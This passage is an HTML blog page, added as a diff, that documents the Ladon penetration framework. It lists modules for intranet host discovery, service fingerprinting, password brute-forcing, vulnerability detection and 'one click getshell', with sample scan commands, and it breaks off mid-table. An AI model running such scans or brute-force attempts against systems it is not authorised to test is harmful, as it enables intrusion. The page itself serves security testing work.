@@ -1,0 +1,1776 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,Tool">
+
+
+<meta name="description" content="Ladon is a multi-threaded plug-in comprehensive scanning artifact for large-scale intranet penetr...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖Tool〗Ladon modular hacking framework |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖Tool〗Ladon modular hacking framework">
+            
+            〖Tool〗Ladon modular hacking framework
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2022/09/11</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                950</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>Ladon is a multi-threaded plug-in comprehensive scanning artifact for large-scale intranet penetration, including port scanning, service identification, network assets, password blasting, high-risk vulnerability detection and one click getshell. It supports batch segment A / segment B / segment C and cross network segment scanning, as well as URL, host and domain name list scanning. Version 11.6 has 252 built-in functional modules<br>
+…</p>
+<span id="more"></span>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-11.6-yellowgreen"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/issues"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
+<h3 id="Ladon-for-Windows">Ladon for Windows</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p>
+<h3 id="Ladon-GUI">Ladon GUI</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.png"></p>
+<h3 id="Ladon-for-Cobalt-Strike">Ladon for Cobalt Strike</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p>
+<h3 id="Ladon-for-PowerShell">Ladon for PowerShell</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
+<h3 id="Python-Ladon">Python Ladon</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p>
+<h3 id="Ladon-for-Linux">Ladon for Linux</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p>
+<h3 id="Instructions">Instructions:</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Subject</th>
+<th>URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Ladon Document Home Page</td>
+<td><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></td>
+</tr>
+<tr>
+<td>1</td>
+<td>Ladon basic document</td>
+<td><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Ladon usage example</td>
+<td><a href="http://k8gege.org/Ladon/example-en.html">http://k8gege.org/Ladon/example-en.html</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Basic Usage Details</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cobalt Strike</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Use of Exp generator</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>highly customized plug-in</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td>external module reference</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki">https://github.com/k8gege/K8CScan/wiki</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>PowerLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/powerladon">https://github.com/k8gege/powerladon</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>PythonLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/PyLadon">https://github.com/k8gege/PyLadon</a></td>
+</tr>
+<tr>
+<td>10</td>
+<td>LinuxLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/KaliLadon">https://github.com/k8gege/KaliLadon</a></td>
+</tr>
+<tr>
+<td>11</td>
+<td>ladongo full platform</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></td>
+</tr>
+<tr>
+<td>12</td>
+<td>Vulnerability demonstration video</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/tree/master/Video">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Ladon6.0 function</td>
+<td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td>
+</tr>
+<tr>
+<td>14</td>
+<td>Ladon6.2 function</td>
+<td><a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Ladon6.4 function</td>
+<td><a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a></td>
+</tr>
+<tr>
+<td>16</td>
+<td>Ladon6.5 function</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>17</td>
+<td>Ladon9.1 Function</td>
+<td><a href="http://k8gege.org/Ladon/ladon91.html">http://k8gege.org/Ladon/ladon91.html</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="Source-code-compilation">Source code compilation</h3>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon.git">https://github.com/k8gege/Ladon.git</a></p>
+<p>Compile with VS2012 or above Net version 3.5 and 4.0 EXE</p>
+<h3 id="Finished-product-download">Finished product download</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
+<p>Win7 / 2008 or installation Net 2. x 3. x system can use Ladon.exe</p>
+<p>Win8-win10 or install Net 4. x system can use Ladon40.exe</p>
+<h3 id="Preface">Preface</h3>
+<p>Whether intranet or internet penetration information collection is very critical, the more information collected, the more accurate the penetration success rate will be.</p>
+<p>However, the success rate is also affected by vulnerabilities, which are affected by timeliness. For large intranets, the scanning speed directly affects the success rate.</p>
+<p>The timeliness of vulnerabilities is 1-2 days. It takes 1 week to scan the intranet or internet. Will many vulnerabilities be missed or allowed to succeed?</p>
+<p>For those big stations with hundreds of thousands of domain names, the faster you find the higher the success rate, and the slower the administrator will patch it.</p>
+<p>Therefore, we need a scanner that supports batch C / B and even a segments, and add custom modules to quickly detect new vulnerabilities.</p>
+<h3 id="About-Ladon">About Ladon</h3>
+<p>Ladon: bin Laden or radon. Due to the integration of many modules, each module can become a tool independently, which is similar to that of a hundred headed dragon.</p>
+<p>Ladon is a mythical animal in Greek mythology, a hundred headed dragon guarding the golden apple. It never sleeps. Heracles lures the dragon to sleep with the hand of the giant carrying the sky</p>
+<p>Kill the dragon and steal the golden apple. Before the dragon died, he sealed his soul in the golden apple. The thief gave the golden apple to Snow White</p>
+<p>In order to repay the kindness, the Golden Apple was given to seven dwarfs. After eating it, they became dragon balls and scattered around the world. The dragon balls are divided into seven, which contain</p>
+<p>The power that can make miracles happen. When you gather 7 dragon beads and pronounce the incantation, you can summon the divine dragon, and the divine dragon will realize a wish put forward by the summoner.</p>
+<h3 id="Program-introduction">Program introduction</h3>
+<p>Ladon is a multi-threaded plug-in comprehensive scanning artifact for large-scale network penetration, including port scanning, service identification, network assets, password blasting, high-risk vulnerability detection and one click getshell. It supports batch a segment / b segment / C segment and cross network segment scanning, as well as URL, host and domain name list scanning. The 11.6 version has 252 built-in functional modules and 18 external modules. Through various protocols and methods, it can quickly obtain the target network survival host IP, computer name, workgroup, shared resources, network card address, operating system version, website, subdomain name, middleware, open services, routers, databases and other information. Vulnerability detection includes MS17010, SMBHost, Weblogic, ActiveMQ, Tomcat, Struts2 series, etc, 13 types of password explosion include databases (MySQL, Oracle, MSSQL), FTP, SSH, VNC, Windows (LDAP, SMB/IPC, NBT, WMI, SmbHash, WmiHash, Winrm), BasicAuth, Tomcat, Weblogic, Rar, etc. Remote execution commands include (smbexec/wmiexe/psexec/atexec/ssheexec/jspshell). The Web fingerprint identification module can identify 75 types (Web applications, middleware, script types, page types), and can highly customize plug-in POC support Net assembly, DLL (C # / Delphi / VC), PowerShell and other language plugins, support the batch call of any external program or command by configuring ini, and the exp generator can generate vulnerability POC at one click to quickly expand the scanning ability. Ladon supports the plug-in scanning of cobalt strike to quickly expand the intranet for horizontal movement.</p>
+<h3 id="Easy-to-use">Easy to use</h3>
+<p>Although Ladon has various functions, it is very simple to use, and anyone can easily use it</p>
+<p>90% of the functions can be used with only one or two parameters, and one module is equivalent to a new tool</p>
+<h3 id="Operating-environment">Operating environment</h3>
+<h4 id="Windows">Windows</h4>
+<p>Ladon.exe can be installed on the Net 2.0 and above in the Win system (. net comes with the Win7 system)</p>
+<p>Such as Cmd, PowerShell, remote control Cmd, WebShell, etc., and Cobalt Strike memory loading</p>
+<p>Ladon. Ps1 is perfectly compatible with win7-win10 PowerShell, and can be loaded remotely without looking at the version to achieve file penetration</p>
+<h4 id="Full-platform-ladongo-supports-Linux-MAC-arm-and-MIPS">Full platform ladongo supports Linux, MAC, arm and MIPS</h4>
+<p>Full platform: Linux, MacOS, windows and other OS</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></p>
+<h3 id="Exotic-conditions">Exotic conditions</h3>
+<p>The actual battle is not so smooth. Some intranet users are too laggy or unable to forward after forwarding, so they can only upload the tool to the target</p>
+<p>Some programs that can upload two or three m take half a day or even can’t be transmitted at all, let alone several tens of m in PY</p>
+<p>Ladon uses C # for research and development, and the program size is very small, about 500K. Even if the horse can’t, it can upload 500K programs</p>
+<p>If you can’t, you can also load from PowerShell remote memory, which is incomparable to large programs compiled by py or go</p>
+<h3 id="Purpose">Purpose</h3>
+<p>One stop service, providing users with a simple, functional and highly flexible scanning tool</p>
+<h3 id="Features">Features</h3>
+<p>Small scanning flow</p>
+<p>Small program size</p>
+<p>Rich and powerful functions</p>
+<p>The program is simple and easy to use</p>
+<p>The plug-in supports multiple languages</p>
+<p>Cross platform (win / Kali / Ubuntu), etc</p>
+<p>Support Cobalt Strike plug-in</p>
+<p>Support PowerShell no file penetration</p>
+<p>Exp generator can generate POC in one click</p>
+<p>Multi version, applicable to various environments</p>
+<h3 id="Program-parameter-function">Program parameter function</h3>
+<ol>
+<li>support specified IP scanning</li>
+</ol>
+<p>2 Support specified domain name scanning</p>
+<ol start="3">
+<li>support scanning of specified machine name</li>
+</ol>
+<p>4 support specified C-segment scanning (IP / 24)</p>
+<p>5 support specified B-segment scanning (IP / 16)</p>
+<p>6 support specified A-segment scanning (IP / 8)</p>
+<p>7 Support specified URL scanning</p>
+<p>8 Support batch IP scanning (ip. txt)</p>
+<p>9 support batch C-segment scanning (ip24. Txt)</p>
+<p>10 Support batch B segment scanning (ip16. txt)</p>
+<p>11 support batch URL scanning (URL. Txt)</p>
+<p>12 support batch domain name scanning (domain. Txt)</p>
+<p>13 Support batch machine name scanning (host. txt)</p>
+<p>14 support batch country segment scanning (CIDR. Txt)</p>
+<p>15 support batch string list (str.txt)</p>
+<p>16 support host account secret list (check. Txt)</p>
+<p>17 support user password list (userpass. Txt)</p>
+<p>18 Support C-segment scanning in specified range</p>
+<p>19 Support parameter loading custom DLL (C # only)</p>
+<p>20 Support parameter loading custom EXE (C # only)</p>
+<p>21 support parameter loading custom ini configuration file</p>
+<p>22 support parameter loading custom PowerShell</p>
+<p>23 support custom programs (system commands or third-party programs, i.e. programs or scripts developed in any language)</p>
+<p>24 plug-in (support multiple languages C # / Delphi / golang / Python / VC / PowerShell)</p>
+<p>25 support cobalt strike (scan the target intranet under the beacon command line or scan the target extranet from the springboard)</p>
+<p>26 support CIDR format IP scanning, such as 100.64.0.0/10192.168.1.1/20, etc</p>
+<p>27 INI configuration supports custom program password explosion</p>
+<h3 id="Built-in-function-module-117">Built in function module (117)</h3>
+<h4 id="0x001-Asset-Scan-11">0x001 Asset Scan (11)</h4>
+<p>Example: Ladon OnlinePC (scan the section C of the current machine, the same for other modules)</p>
+<p>Example: Ladon 192.168.1.8/24 OnlinePC</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>module name</th>
+<th>function description</th>
+<th>return result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[ICMP]( <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> ）</td>
+<td>Live host scanning</td>
+<td>Live IP (fast detection speed 3-6 seconds/C segment)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[OnlinePC]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E5% AD% 98% E6% B4% BB% E4% B8% BB% E6% 9C% BA% E6% 89% AB% E6% 8F% 8F)</td>
+<td>Survival host scanning</td>
+<td>Survival IP, Mac address, machine name, and device manufacturer</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[OnlineIP]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E5% ad% 98% E6% B4% BB% E4% B8% BB% E6% 9C% Ba% E6% 89% AB% E6% 8F% 8F)</td>
+<td>only surviving host IP</td>
+<td>surviving IP</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[UrlScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -C% E6% AE% B5% E5% 9F% 9F% E5% 90% 8durl% E6% 89% AB% E6% 8F% 8F)</td>
+<td>URL domain name scan</td>
+<td>server URL (do not verify IP, domain name and web title)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[SameWeb]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -C% E6% AE% B5% E6% 97% 81% E7% AB% 99% E5% 9F% 9F% E5% 90% 8D% E6% 89% AB% E6% 8F% 8F)</td>
+<td>same server domain name scanning</td>
+<td>same server URL (verify IP, domain name, web title)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[WebScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -Web% E8% B5% 84% E4% BA% A7% E6% 89% AB% E6% 8F% 8F)</td>
+<td>Web information scanning</td>
+<td>Survival IP, host name, banner, and Web title</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[WebDir]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -Web% E7% 9B% AE% E5% BD% 95% E6% 89% AB% E6% 8F% 8F)</td>
+<td>Background directory scanning</td>
+<td>Address, HTTP status</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[SubDomain]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E5% ad% 90% E5% 9F% 9F% E5% 90% 8D% E7% 88% 86% E7% A0% B4)</td>
+<td>subdomain name blasting</td>
+<td>subdomain name (can be resolved by domainip / hostip)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[DomainIP]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD">https://github.com/k8gege/Ladon/wiki/实用功能</a> -%E6% 89% B9% E9% 87% 8F% E5% 9F% 9F% E5% 90% 8D% E8% A7% A3% E6% 9E% 90)</td>
+<td>domain name resolution IP</td>
+<td>domain name, IP</td>
+</tr>
+<tr>
+<td>10</td>
+<td>[HostIP]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD">https://github.com/k8gege/Ladon/wiki/实用功能</a> -%E6% 89% B9% E9% 87% 8F% E4% B8% BB% E6% 9C% Ba% E5% 90% 8D% E8% A7% A3% E6% 9E% 90)</td>
+<td>host name to IP</td>
+<td>IP, domain name</td>
+</tr>
+<tr>
+<td>11</td>
+<td>[AdiDnsDump]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>Acquisition of machine information in the domain (please use LdapScan to probe in non domain)</td>
+<td>IP, domain name</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x002-fingerprint-identification-service-identification-17">0x002 fingerprint identification / service identification (17)</h4>
+<p>Example: Ladon osscan</p>
+<p>Example: Ladon 192.168.1.8/24 OsScan</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>module name</th>
+<th>function description</th>
+<th>return result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[OsScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E6% 93% 8D% E4% BD% 9C% E7% B3% BB% E7% BB% 9F% E6% 8E% A2% E6% B5% 8B)</td>
+<td>OS version detection</td>
+<td>Survival IP, workgroup machine name, operating system, open service</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[PortScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E7% AB% AF% E5% 8F% A3% E6% 89% AB% E6% 8F% 8F (% E6% 9C% 8D% E5% 8A% A1% E8% AF% 86% E5% 88% AB)</td>
+<td>Port scanning includes Banner</td>
+<td>Host name, open port, service identification, Banner, Web</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[WhatCMS]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -Web% E6% 8C% 87% E7% BA% B9% E8% AF% 86% E5% 88% AB)</td>
+<td>86 kinds of Web fingerprint identification</td>
+<td>URL, CMS, mail system, login page, middleware (such as Apache Tomecat IIS), etc</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[CiscoScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E6% 80% 9D% E7% A7% 91% E8% AE% be% E5% A4% 87% E6% 89% AB% E6% 8F% 8F)</td>
+<td>Cisco device scan</td>
+<td>surviving IP, device model, host name, boot, hardware version</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[EnumMssql]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E6% 9E% 9A% E4% B8% be% E5% 86% 85% E7% BD% 91mssql% E4% B8% BB% E6% 9C% BA)</td>
+<td>enumerate MSSQL database hosts</td>
+<td>database IP, machine name, SQL version</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[EnumShare]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://github.com/k8gege/Ladon/wiki/信息收集</a> -%E6% 9E% 9A% E4% B8% be% E7% BD% 91% E7% BB% 9C% E5% 85% B1% E4% Ba% AB% E8% B5% 84% E6% Ba% 90)</td>
+<td>enumerate network shared resources</td>
+<td>domain, surviving IP, shared path</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[LdapScan]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>when no password is specified, only the LDAP server</td>
+<td>IP is detected as an LDAP server</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[FtpScan]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>when no password is specified, only detect whether the FTP server</td>
+<td>IP is an FTP server</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[EthScan]( <a href="http://k8gege.org/Ladon/ethscan.html">http://k8gege.org/Ladon/ethscan.html</a> ）</td>
+<td>OXID multi network card host detection</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td>[DnsScan]( <a href="http://k8gege.org/Ladon/ladon91.html">http://k8gege.org/Ladon/ladon91.html</a> ）</td>
+<td>OXID multi network card host detection</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>[SmbInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>SMB information detection</td>
+<td>surviving IP, machine name, win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>12</td>
+<td>[NbtInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>NBT information detection</td>
+<td>surviving IP, machine name, win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>13</td>
+<td>[WmiInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>WMI information detection</td>
+<td>surviving IP, machine name, win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>14</td>
+<td>[RdpInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>RDP information detection</td>
+<td>surviving IP, machine name, win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>15</td>
+<td>[WinrmInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>Winrm information detection</td>
+<td>Survival IP, machine name, Win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>16</td>
+<td>[MssqlInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>MSSQL information detection</td>
+<td>surviving IP, machine name, win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>17</td>
+<td>[ExchangeInfo]( <a href="http://k8gege.org/Ladon/ntlminfo.html">http://k8gege.org/Ladon/ntlminfo.html</a> ）</td>
+<td>Exchange information detection</td>
+<td>Survival IP, machine name, Win version, domain name, DNS</td>
+</tr>
+<tr>
+<td>18</td>
+<td>[ WhatCms]( <a href="http://k8gege.org/p/FindExchange.html">http://k8gege.org/p/FindExchange.html</a> ）</td>
+<td>exchange server probe</td>
+<td>live IP, exchange, banner</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x003-Password-detection-password-explosion-18">0x003 Password detection/password explosion (18)</h4>
+<p>[User defined port (IP: port), account secret detection (user password), host account secret detection (IP port database user password)]</p>
+<p>Example: Ladon SshScan</p>
+<p>Example: Ladon 192.168.1.8/24 SshScan</p>
+<p>Example: Ladon 192.168.1.8:22 SshScan (specify the port)</p>
+<p>Example: Ladon test rar RarScan</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module Name</th>
+<th>Function Description</th>
